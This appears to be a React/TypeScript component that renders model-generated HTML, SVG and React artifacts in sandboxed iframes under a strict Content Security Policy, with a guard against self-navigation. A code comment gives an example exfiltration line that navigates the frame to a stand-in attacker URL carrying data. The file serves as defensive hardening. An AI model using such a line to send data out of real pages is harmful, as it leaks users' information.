import { memo, useCallback, useMemo, useRef, type FC } from 'react';
import type { ArtifactType } from '@/providers/ArtifactProvider';
import { MarkdownText } from '@/components/thread/MarkdownText';
import { CodeBlock } from '@/components/thread/CodeBlock';

/**
 * Sandboxed iframe host for html / svg / react artifacts.
 *
 * SECURITY: `sandbox="allow-scripts"` only — deliberately omits
 * `allow-same-origin` so artifact scripts cannot reach `window.app`,
 * cookies, localStorage, or the parent DOM.
 */
const SandboxedFrame: FC<{ srcDoc: string; title: string }> = memo(({ srcDoc, title }) => {
  // A sandboxed srcdoc frame can still exfiltrate by navigating ITSELF
  // (location.href = 'https://attacker/?data'), which connect-src doesn't
  // cover. The CSP adds `navigate-to 'none'`; this onLoad guard is defense in
  // depth — if the frame navigates AWAY from the srcDoc we intentionally set,
  // blank it. We track the srcDoc we last committed so a legitimate
  // artifact/version update (which changes `srcDoc` and triggers a load) is
  // allowed, while an in-frame `location =` navigation (which does NOT change
  // our prop) is treated as hostile.
  const committedSrcDoc = useRef<string | null>(null);
  const handleLoad = useCallback(
    (e: React.SyntheticEvent<HTMLIFrameElement>) => {
      if (committedSrcDoc.current === srcDoc) {
        // Load fired without our srcDoc changing → self-navigation. Block it.
        e.currentTarget.srcdoc = '<!doctype html><meta charset="utf-8"><title>blocked</title>';
        return;
      }
      committedSrcDoc.current = srcDoc;
    },
    [srcDoc],
  );
  return (
    <iframe
      title={title}
      srcDoc={srcDoc}
      sandbox="allow-scripts"
      referrerPolicy="no-referrer"
      onLoad={handleLoad}
      className="h-full w-full border-0 bg-white"
    />
  );
});

const BASE_STYLES =
  'body{margin:0;font-family:ui-sans-serif,system-ui,-apple-system,sans-serif;color:#0f172a;background:#ffffff}*,*::before,*::after{box-sizing:border-box}';

/**
 * CSP for artifact frames. Blocks all network egress by default so a model-
 * supplied script can't beacon/fetch to external or localhost/private targets.
 * `img-src` allows only inline data URIs. `react` mode needs the unpkg CDN for
 * React + Babel, so it widens script-src/connect-src to that origin only.
 */
function cspMeta(mode: 'static' | 'react'): string {
  // React mode runs Babel-standalone, which compiles JSX via eval/Function —
  // Chromium blocks that without 'unsafe-eval'. Scoped to the sandboxed react
  // frame only (no allow-same-origin, connect-src limited to unpkg).
  const scriptSrc = mode === 'react' ? "'self' 'unsafe-inline' 'unsafe-eval' https://unpkg.com" : "'unsafe-inline'";
  const connectSrc = mode === 'react' ? 'https://unpkg.com' : "'none'";
  const policy = [
    "default-src 'none'",
    `script-src ${scriptSrc}`,
    "style-src 'unsafe-inline'",
    'img-src data:',
    'font-src data:',
    `connect-src ${connectSrc}`,
    "form-action 'none'",
    "navigate-to 'none'",
    "base-uri 'none'",
  ].join('; ');
  return `<meta http-equiv="Content-Security-Policy" content="${policy}">`;
}

function wrapHtml(content: string): string {
  const trimmed = content.trim();
  const csp = cspMeta('static');
  // ALWAYS re-wrap into a known-safe document with the CSP as the very first
  // head element. We never preserve model-supplied <head> or pre-<head> content
  // (a `<script>` before an injected CSP would execute before the policy
  // applies). Extract the <body> inner HTML if present, else strip any
  // doctype/html/head/body wrappers and treat the remainder as body content.
  let body: string;
  const bodyMatch = /<body\b[^>]*>([\s\S]*?)<\/body>/i.exec(trimmed);
  if (bodyMatch) {
    body = bodyMatch[1];
  } else {
    body = trimmed
      .replace(/^<!doctype[^>]*>/i, '')
      .replace(/<head\b[^>]*>[\s\S]*?<\/head>/gi, '')
      .replace(/<\/?html[^>]*>/gi, '')
      .replace(/<\/?body[^>]*>/gi, '')
      .trim();
  }
  return `<!doctype html><html><head><meta charset="utf-8">${csp}<style>${BASE_STYLES}</style></head><body>${body}</body></html>`;
}

function wrapSvg(content: string): string {
  const svg = content.trim();
  const body = svg.startsWith('<svg')
    ? svg
    : `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">${svg}</svg>`;
  return `<!doctype html><html><head><meta charset="utf-8">${cspMeta('static')}<style>${BASE_STYLES}svg{display:block;max-width:100%;height:auto;margin:auto}</style></head><body>${body}</body></html>`;
}

/**
 * React artifacts are wrapped in a standalone document that pulls React 18
 * UMD builds from a CDN and Babel-standalone for JSX. If the network is
 * unavailable the frame degrades to showing the raw source (a plain fallback
 * script detects that React/Babel didn't load and renders the source instead).
 */
function wrapReact(content: string): string {
  const normalized = content
    .replace(/^\s*export\s+default\s+/m, 'const App = ')
    .replace(/^\s*export\s+(?=(const|let|var|function|class)\b)/gm, '');
  const escaped = normalized.replace(/<\/script>/gi, '<\\/script>');
  const sourceLiteral = JSON.stringify(content);
  return [
    '<!doctype html><html><head><meta charset="utf-8">',
    cspMeta('react'),
    `<style>${BASE_STYLES}#root{min-height:100vh}</style>`,
    '<script crossorigin src="https://unpkg.com/react@18/umd/react.development.js"></script>',
    '<script crossorigin src="https://unpkg.com/react-dom@18/umd/react-dom.development.js"></script>',
    '<script crossorigin src="https://unpkg.com/@babel/standalone/babel.min.js"></script>',
    '</head><body><div id="root"></div>',
    '<script type="text/babel" data-presets="react">',
    escaped,
    '\n;try{const __c=typeof App!=="undefined"?App:(typeof Component!=="undefined"?Component:null);',
    'if(__c){ReactDOM.createRoot(document.getElementById("root")).render(React.createElement(__c));}',
    'else{document.getElementById("root").innerHTML="<pre style=\\"padding:1rem;color:#b91c1c\\">No component named App or Component was exported.</pre>";}}',
    'catch(e){document.getElementById("root").innerHTML="<pre style=\\"padding:1rem;color:#b91c1c\\">"+String(e)+"</pre>";}',
    '</script>',
    // Offline/CDN-blocked fallback: if React or Babel never loaded, the
    // text/babel script above is ignored and #root stays empty. Detect that and
    // render the raw source so the preview degrades gracefully.
    '<script>',
    `var __src=${sourceLiteral};`,
    'setTimeout(function(){',
    'var loaded=(typeof React!=="undefined"&&typeof ReactDOM!=="undefined"&&typeof Babel!=="undefined");',
    'var root=document.getElementById("root");',
    'if(!loaded&&root&&!root.hasChildNodes()){',
    'var note=document.createElement("div");',
    'note.style.cssText="padding:0.5rem 1rem;background:#fef3c7;color:#92400e;font:12px sans-serif";',
    'note.textContent="React runtime unavailable (offline or CDN blocked) — showing source.";',
    'var pre=document.createElement("pre");',
    'pre.style.cssText="padding:1rem;white-space:pre-wrap;word-break:break-word";',
    'pre.textContent=__src;',
    'root.appendChild(note);root.appendChild(pre);}',
    '},1500);',
    '</script>',
    '</body></html>',
  ].join('');
}

/** `mermaid` is not in package.json (npmjs.org is blocked) — render source with a note. */
const MermaidStub: FC<{ content: string }> = ({ content }) => (
  <div className="flex h-full flex-col">
    <div className="border-b border-amber-500/30 bg-amber-500/10 px-4 py-2 text-xs text-amber-700 dark:text-amber-400">
      Mermaid rendering is not available in this build. Showing diagram source.
    </div>
    <div className="min-h-0 flex-1 overflow-auto p-3">
      <CodeBlock code={content} language="mermaid" maxHeight="none" />
    </div>
  </div>
);

export const ArtifactRenderer: FC<{ type: ArtifactType; content: string; title: string }> = ({
  type,
  content,
  title,
}) => {
  const srcDoc = useMemo(() => {
    if (type === 'html') return wrapHtml(content);
    if (type === 'svg') return wrapSvg(content);
    if (type === 'react') return wrapReact(content);
    return null;
  }, [type, content]);

  if (type === 'markdown') {
    return (
      <div className="h-full overflow-y-auto px-5 py-4">
        <MarkdownText text={content} />
      </div>
    );
  }

  if (type === 'mermaid') {
    return <MermaidStub content={content} />;
  }

  if (srcDoc != null) {
    return <SandboxedFrame srcDoc={srcDoc} title={title} />;
  }

  // 'text' fallback
  return (
    <div className="h-full overflow-auto p-4">
      <pre className="whitespace-pre-wrap break-words font-mono text-xs text-foreground">{content}</pre>
    </div>
  );
};
